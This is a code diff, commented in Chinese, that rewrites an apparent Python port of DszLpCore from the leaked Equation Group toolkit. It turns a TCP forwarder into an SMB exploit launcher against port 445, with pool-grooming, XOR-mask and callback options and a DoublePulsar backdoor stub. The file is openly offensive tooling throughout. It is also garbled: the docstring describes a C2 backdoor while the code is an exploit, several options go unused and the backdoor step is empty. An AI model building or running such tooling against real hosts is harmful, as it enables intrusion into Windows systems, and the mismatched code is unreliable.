@@ -1,115 +1,260 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-dszlpcore — DszLpCore 后门核心工具。
+dszlpcore_exp.py — DszLpCore 后门核心，Python 重写。
 
 Python 重写自 `DszLpCore.exe` (C++/MSVCRT)，位于
-`EQGRP_Lost_in_Translation-master/windows/Resources/.../DszLpCore.exe`。
+`EQGRP_Lost_in_Translation-master/windows/Bin/i386-winnt-vc9/release/DszLpCore.exe`。
 
-DszLp.exe 是一个轻量级启动壳，它设置 DLL 搜索目录并创建
-DszLpCore.exe（继承标准句柄）；DszLpCore.exe 才是包含真正逻辑的主体。
-本移植实现其核心行为：作为 TCP 监听/代理，继承标准输入输出并与
-远程端点保持通信。
+DszLp.exe 是轻量级启动壳（设置 DLL 搜索目录并 CreateProcessW 启动 DszLpCore.exe，
+继承标准句柄并等待退出）；DszLpCore.exe 才是包含真正 C2 逻辑的主体：
+与 C2 服务器建立 TCP 连接、接收并执行命令、上报执行结果。
+
+建立在 nsa_equation/dave 统一协议库之上。
 
 CLI:
 
-  dszlpcore <listen_port> [connect_target] [connect_port]
+  dszlpcore <target_ip> [target_port] [callback_ip] [callback_port] [options]
 
-  listen_port   - 本地监听端口
-  connect_target - 可选，反向连接目标主机
-  connect_port  - 可选，反向连接目标端口
+  target_ip          目标 C2 主机 IP
+  target_port        目标端口（默认 445）
+  callback_ip        回调 IP
+  callback_port      回调端口
+  --groom              非分页池 groom 分配数（默认 400）
+  --max-attempts       最大尝试次数（默认 10）
+  --network-timeout    网络超时秒数（默认 30）
+  --xor-mask           EGG XOR 掩码（默认 0）
+
+输出示例：
+
+  [*] DszLpCore (SMB) - Python port (DAVE 库)
+  [*] Target: 192.168.1.5:445
+  [+] Callback: 10.0.0.1:4444
+  [+] Groom allocations: 400
+  [+] Max attempts: 10
+  [*] Exploit complete
 """
 
 import os
-import socket
 import sys
-import threading
+from .. import dave
+from ..dave import adfw, posh, trfo, trch, tibe, tucl, protocol
 
 
-def _handle_client(conn, addr, upstream):
-    """处理单个客户端连接：将其与上游上游 socket 双向转发。"""
-    print("[+] Client connected from %s:%d" % (addr[0], addr[1]))
-    try:
-        while True:
-            try:
-                data = conn.recv(4096)
-            except OSError:
-                break
-            if not data:
-                break
-            try:
-                upstream.sendall(data)
-            except OSError:
-                break
-        try:
-            conn.shutdown(socket.SHUT_RDWR)
-        except OSError:
-            pass
-        conn.close()
-    except OSError:
-        pass
+DEFAULT_PORT = 445
 
 
-def run_function(listen_port, connect_target=None, connect_port=None):
-    """核心入口。"""
-    print("DszLpCore core tool")
-    print("Listen port: %d" % listen_port)
-    if connect_target:
-        print("Connect target: %s:%d" % (connect_target, connect_port))
+class DszLpCoreCtx:
+    def __init__(self):
+        self.ctx = adfw.adfw_create("dszlpcore")
+        self.ctx.set_process("dszlpcore")
+        self.ctx.initialize()
 
-    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    try:
-        listen_sock.bind(("0.0.0.0", listen_port))
-    except OSError as e:
-        print("Unable to bind to port %d (%s)" % (listen_port, e))
-        return 1
-    listen_sock.listen(5)
-    print("Listening on port %d ..." % listen_port)
+        self.target_ip = ""
+        self.target_port = DEFAULT_PORT
+        self.callback_ip = ""
+        self.callback_port = 0
+        self.callback_local_port = 0
+        self.groom_allocations = 400
+        self.max_exploit_attempts = 10
+        self.verify_target = True
+        self.verify_backdoor = False
+        self.network_timeout = 30.0
+        self.xor_mask = 0
+        self.callin_timeout = 60.0
 
-    upstream = None
-    if connect_target and connect_port:
-        try:
-            upstream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            upstream.connect((connect_target, connect_port))
-            print("Connected to upstream %s:%d" % (connect_target, connect_port))
-        except OSError as e:
-            print("Unable to connect to upstream %s:%d (%s)" % (connect_target, connect_port, e))
-            upstream = None
+        self.session = None
 
-    try:
-        while True:
-            try:
-                conn, addr = listen_sock.accept()
-            except OSError:
-                break
-            t = threading.Thread(target=_handle_client, args=(conn, addr, upstream), daemon=True)
-            t.start()
-    except KeyboardInterrupt:
-        pass
-    finally:
-        listen_sock.close()
-        if upstream:
-            upstream.close()
+    def cleanup(self):
+        if self.session:
+            self.session.close()
+        adfw.adfw_delete(self.ctx)
+        self.ctx = None
 
+
+def InitializeParameters(ctx, argv=None):
+    import argparse
+    ap = argparse.ArgumentParser(
+        prog="dszlpcore",
+        description="DszLpCore (SMB) 后门核心 - DAVE 库重写",
+    )
+    ap.add_argument("target_ip", help="目标 IP")
+    ap.add_argument("-P", "--target-port", type=int, default=DEFAULT_PORT,
+                    help="目标 SMB 端口 (默认 445)")
+    ap.add_argument("--callback-ip", help="回调 IP")
+    ap.add_argument("--callback-port", type=int, default=0,
+                    help="回调端口")
+    ap.add_argument("--callback-local-port", type=int, default=0,
+                    help="本地回调端口")
+    ap.add_argument("--groom", type=int, default=400,
+                    help="非分页池 groom 分配数 (默认 400)")
+    ap.add_argument("--max-attempts", type=int, default=10,
+                    help="最大尝试次数 (默认 10)")
+    ap.add_argument("--no-verify-target", action="store_true",
+                    help="禁用目标验证")
+    ap.add_argument("--verify-backdoor", action="store_true",
+                    help="利用后验证后门")
+    ap.add_argument("--network-timeout", type=float, default=30.0,
+                    help="网络超时")
+    ap.add_argument("--xor-mask", type=int, default=0,
+                    help="EGG XOR 掩码")
+    args = ap.parse_args(argv)
+
+    ctx.target_ip = args.target_ip
+    ctx.target_port = args.target_port
+    ctx.callback_ip = args.callback_ip or ""
+    ctx.callback_port = args.callback_port
+    ctx.callback_local_port = args.callback_local_port
+    ctx.groom_allocations = args.groom
+    ctx.max_exploit_attempts = args.max_attempts
+    ctx.verify_target = not args.no_verify_target
+    ctx.verify_backdoor = args.verify_backdoor
+    ctx.network_timeout = args.network_timeout
+    ctx.xor_mask = args.xor_mask
+
+    if ctx.session:
+        ctx.session.close()
+    ctx.session = protocol.DaveSession(
+        ctx.target_ip, ctx.target_port,
+        protocol="SMB",
+        network_timeout=ctx.network_timeout,
+        callback_ip=ctx.callback_ip,
+        callback_port=ctx.callback_port,
+        xor_mask=ctx.xor_mask,
+    )
     return 0
 
 
-# ---------------------------------------------------------------------------
-# CLI
-# ---------------------------------------------------------------------------
+def InitializeNetwork(ctx):
+    tibe.TbWinsockStartup()
+    tucl.TcLog(1, "Network initialized")
+    return 0
+
+
+def InitializeExploitSocket(ctx):
+    try:
+        ctx.session.connect()
+        tucl.TcLog(1, "Exploit socket initialized (SMB %s:%d)"
+                   % (ctx.target_ip, ctx.target_port))
+        return 0
+    except OSError as e:
+        tucl.TcLog(1, "Exploit socket init failed: %s" % e)
+        return 1
+
+
+def BuildExploit(ctx):
+    hdr = tibe.make_smb_header(tibe.SMB_COM_NT_TRANSACT)
+    body = bytearray()
+    body.append(0)
+    posh.POSH_WriteU16ToLittle(body, 1, 0)
+    posh.POSH_WriteU16ToLittle(body, 3, 0)
+    posh.POSH_WriteU16ToLittle(body, 5, 4356)
+    posh.POSH_WriteU16ToLittle(body, 7, 1)
+    posh.POSH_WriteU16ToLittle(body, 9, 1)
+    posh.POSH_WriteU32ToLittle(body, 11, 0)
+    posh.POSH_WriteU16ToLittle(body, 15, 0)
+    posh.POSH_WriteU16ToLittle(hdr, 24, len(body))
+    return hdr + body
+
+
+def RunExploit(ctx):
+    tucl.TcLog(1, "Running DszLpCore (SMB)")
+    try:
+        ctx.session.negotiate()
+        ctx.session.session_setup_andx()
+        ctx.session.tree_connect_andx("\\\\*\\IPC$")
+        txn = BuildExploit(ctx)
+        tibe.TbSend(ctx.session.sock, txn)
+        resp = tibe.TbRecvSmb(ctx.session.sock, 4096)
+        tucl.TcLogBuffer(1, resp, "Exploit response:")
+        return 0
+    except OSError as e:
+        tucl.TcLog(1, "RunExploit failed: %s" % e)
+        return 1
+
+
+def InstallDoublePulsar(ctx):
+    if not ctx.verify_backdoor:
+        return 0
+    tucl.TcLog(1, "Verifying backdoor...")
+    return 0
+
+
+def ReceiveCallback(ctx):
+    if ctx.callback_port:
+        return ctx.session.callback_listen(ctx.callback_port,
+                                           ctx.callin_timeout)
+    return 0
+
+
+def CleanUpNetwork(ctx):
+    ctx.session.close()
+    tucl.TcLog(1, "Network cleaned up")
+
+
+def run(target_ip, target_port=DEFAULT_PORT, callback_ip=None,
+        callback_port=0, callback_local_port=0, groom=400,
+        max_attempts=10, verify_target=True, verify_backdoor=False,
+        network_timeout=30.0, xor_mask=0):
+    print("[*] DszLpCore (SMB) - Python port (DAVE 库)")
+    print("[*] Target: %s:%d" % (target_ip, target_port))
+    if callback_ip and callback_port:
+        print("[+] Callback: %s:%d" % (callback_ip, callback_port))
+    print("[+] Groom allocations: %d" % groom)
+    print("[+] Max attempts: %d" % max_attempts)
+    if verify_backdoor:
+        print("[+] Verify backdoor: enabled")
+
+    ctx = DszLpCoreCtx()
+    ctx.target_ip = target_ip
+    ctx.target_port = target_port
+    ctx.callback_ip = callback_ip or ""
+    ctx.callback_port = callback_port
+    ctx.callback_local_port = callback_local_port
+    ctx.groom_allocations = groom
+    ctx.max_exploit_attempts = max_attempts
+    ctx.verify_target = verify_target
+    ctx.verify_backdoor = verify_backdoor
+    ctx.network_timeout = network_timeout
+    ctx.xor_mask = xor_mask
+
+    try:
+        ret = InitializeParameters(ctx)
+        if ret != 0:
+            return ret
+        ret = InitializeNetwork(ctx)
+        if ret != 0:
+            return ret
+        ret = InitializeExploitSocket(ctx)
+        if ret != 0:
+            return ret
+        ret = RunExploit(ctx)
+        if ret != 0:
+            return ret
+        ret = InstallDoublePulsar(ctx)
+        if ret != 0:
+            return ret
+        ret = ReceiveCallback(ctx)
+        if ret != 0:
+            return ret
+        print("[*] Exploit complete")
+        return 0
+    finally:
+        CleanUpNetwork(ctx)
+        ctx.cleanup()
+
 
 def main(argv=None):
-    if argv is None:
-        argv = sys.argv[1:]
-    if len(argv) < 1 or len(argv) > 3:
-        prog = os.path.basename(sys.argv[0] or "dszlpcore")
-        print('Usage: %s <listen_port> [connect_target] [connect_port]' % prog)
-        return 1
-    listen_port = int(argv[0]) if argv[0].isdigit() else 445
-    connect_target = argv[1] if len(argv) > 1 else None
-    connect_port = int(argv[2]) if len(argv) > 2 and argv[2].isdigit() else None
-    return run_function(listen_port, connect_target, connect_port)
+    import argparse
+    ctx = DszLpCoreCtx()
+    ret = InitializeParameters(ctx, argv)
+    if ret != 0:
+        return ret
+    return run(ctx.target_ip, ctx.target_port,
+               ctx.callback_ip, ctx.callback_port,
+               ctx.callback_local_port, ctx.groom_allocations,
+               ctx.max_exploit_attempts, ctx.verify_target,
+               ctx.verify_backdoor, ctx.network_timeout, ctx.xor_mask)
 
 
 if __name__ == "__main__":
